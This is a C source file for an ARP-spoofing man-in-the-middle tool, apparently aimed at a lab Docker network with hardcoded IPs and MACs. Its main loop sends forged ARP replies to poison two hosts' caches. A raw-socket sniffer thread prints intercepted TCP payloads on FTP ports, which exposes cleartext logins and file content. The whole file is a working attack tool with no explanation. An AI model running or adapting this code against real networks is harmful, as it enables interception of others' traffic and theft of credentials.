#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/ether.h>
#include <unistd.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <linux/if_packet.h>   
#include <sys/ioctl.h>        
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <pthread.h>
#include <ctype.h>

#define ETH_HDR_LEN 14
#define ARP_PKT_LEN 28


typedef struct eth_h {
    unsigned char dest_mac[6];
    unsigned char src_mac[6];
    unsigned short protocol;
} eth_hdr;

typedef struct arp_h {
    unsigned short hw_type;
    unsigned short protocol_type;
    unsigned char hw_size;
    unsigned char protocol_size;
    unsigned short opcode;
    unsigned char sender_mac[6];
    unsigned char sender_ip[4];
    unsigned char target_mac[6];
    unsigned char target_ip[4];
} arp_hdr;


void send_arp_reply(char* iface, char* target_mac, char* your_mac, char* gateway_ip, char* target_ip)
{
  
    int sockfd;
    unsigned char buffer[ETH_HDR_LEN + ARP_PKT_LEN];
    eth_hdr *eth = (eth_hdr *)buffer;
    arp_hdr *arp = (arp_hdr *)(buffer + ETH_HDR_LEN);
    struct sockaddr_ll socket_address = {0};
    struct ifreq ifr;
    sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sockfd < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }
    strncpy(ifr.ifr_name, iface, IFNAMSIZ);
    if (ioctl(sockfd, SIOCGIFINDEX, &ifr) < 0) {
        perror("IOCTL failed");
        close(sockfd);
        exit(EXIT_FAILURE);
    }
    socket_address.sll_ifindex = ifr.ifr_ifindex;
    memcpy(eth->dest_mac, ether_aton(target_mac), 6);
    memcpy(eth->src_mac, ether_aton(your_mac), 6);
    eth->protocol = htons(0x0806);
    arp->hw_type = htons(1);
    arp->protocol_type = htons(0x0800);
    arp->hw_size = 6;
    arp->protocol_size = 4;
    arp->opcode = htons(2);
    memcpy(arp->sender_mac, ether_aton(your_mac), 6);
    inet_pton(AF_INET, gateway_ip, arp->sender_ip);
    memcpy(arp->target_mac, ether_aton(target_mac), 6);
    inet_pton(AF_INET, target_ip, arp->target_ip);
    memcpy(socket_address.sll_addr, ether_aton(target_mac), 6);
    socket_address.sll_halen = ETH_ALEN;
    if (sendto(sockfd, buffer, ETH_HDR_LEN + ARP_PKT_LEN, 0,
               (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {
        perror("Failed to send packet");
        close(sockfd);
        exit(EXIT_FAILURE);
    }
}
void print_hex_ascii(const unsigned char *data, int len) {
    int i, j;
    for(i = 0; i < len; i++) {
        if (i != 0 && i % 16 == 0) {
            printf("  ");
            for(j = i - 16; j < i; j++) {
                if (data[j] >= 32 && data[j] <= 128)
                    printf("%c", data[j]);
                else
                    printf(".");
            }
            printf("\n");
        }
        if (i % 16 == 0) printf("  ");
        printf("%02x ", data[i]);
    }
    
    if (len % 16 != 0) {
        int spaces = (16 - (len % 16)) * 3;
        printf("%*s", spaces, "");
        for(j = (len - (len % 16)); j < len; j++) {
            if (data[j] >= 32 && data[j] <= 128)
                printf("%c", data[j]);
            else
                printf(".");
        }
    }
    printf("\n");
}
void print_packet(unsigned char * buffer,size_t size)
{
    struct ethhdr *eth = (struct ethhdr *)buffer;
    struct iphdr *ip = (struct iphdr *)(buffer + ETH_HDR_LEN);
    struct tcphdr *tcp = (struct tcphdr *)(buffer + ETH_HDR_LEN + sizeof(struct iphdr));
    unsigned char *payload = buffer + ETH_HDR_LEN + ip->ihl * 4 + tcp->doff * 4;
    int payload_len = ntohs(ip->tot_len) - ip->ihl * 4 - tcp->doff * 4;

    if (ip->protocol == IPPROTO_TCP && payload_len > 0) {
        printf("Source MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
            eth->h_source[0], eth->h_source[1], eth->h_source[2],
            eth->h_source[3], eth->h_source[4], eth->h_source[5]);
        printf("Destination MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
                eth->h_dest[0], eth->h_dest[1], eth->h_dest[2],
                eth->h_dest[3], eth->h_dest[4], eth->h_dest[5]);
        printf("Source IP: %s\n", inet_ntoa(*(struct in_addr *)&ip->saddr));
        printf("Dest IP: %s\n", inet_ntoa(*(struct in_addr *)&ip->daddr));
        printf("Source Port: %d\n", ntohs(tcp->source));
        printf("Dest Port: %d\n", ntohs(tcp->dest));
        uint16_t src_port = ntohs(tcp->source);
        uint16_t dst_port = ntohs(tcp->dest);
        
        if (src_port == 21 || dst_port == 21 || 
            src_port == 20 || dst_port == 20 || 
            src_port > 21000 || dst_port > 21000) {  
            printf("\n=== FTP Content ===\n");
            for(int i = 0; i < payload_len; i++) {
                if (isprint(payload[i]) || payload[i] == '\n' || payload[i] == '\r') {
                    printf("%c", payload[i]);
                }
            }
            printf("\n=================\n");
        }
    }
}

void* sniff_packets(void *arg) {
    int sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    const char *iface = "br-ef81d046a1ff";
    unsigned int ifindex = if_nametoindex(iface);
    struct sockaddr_ll addr = {0};
    memset(&addr, 0, sizeof(struct sockaddr_ll));
    addr.sll_family = AF_PACKET;
    addr.sll_ifindex = ifindex;
    addr.sll_protocol = htons(ETH_P_ALL);
    if (bind(sockfd, (struct sockaddr *)&addr, sizeof(struct sockaddr_ll)) < 0) {
        perror("Failed to bind socket");
        exit(EXIT_FAILURE);
    }
    unsigned char buffer[65536];
    while (1) {
        int data_size = recvfrom(sockfd, buffer, 65536, 0, NULL, NULL);
        if (data_size > 0) {
            print_packet(buffer, data_size);
        }
    }
    return NULL;
}

int main() {
    int turn = 0;
    pthread_t sniff_thread;
    char *iface = "br-ef81d046a1ff";
    char *target_ip = "172.18.0.3";
    char *gateway_ip = "172.18.0.2";
    char *your_mac = "02:42:46:6f:8f:09";
    char *target_mac = "02:42:ac:12:00:03";
    pthread_create(&sniff_thread, NULL, sniff_packets, NULL);
    while (1) {
        send_arp_reply(iface, target_mac, your_mac, gateway_ip, target_ip);
        send_arp_reply(iface, "02:42:ac:12:00:02", your_mac,target_ip, "172.18.0.2");
        sleep(5);
        turn++;
    }
    return 0;
}
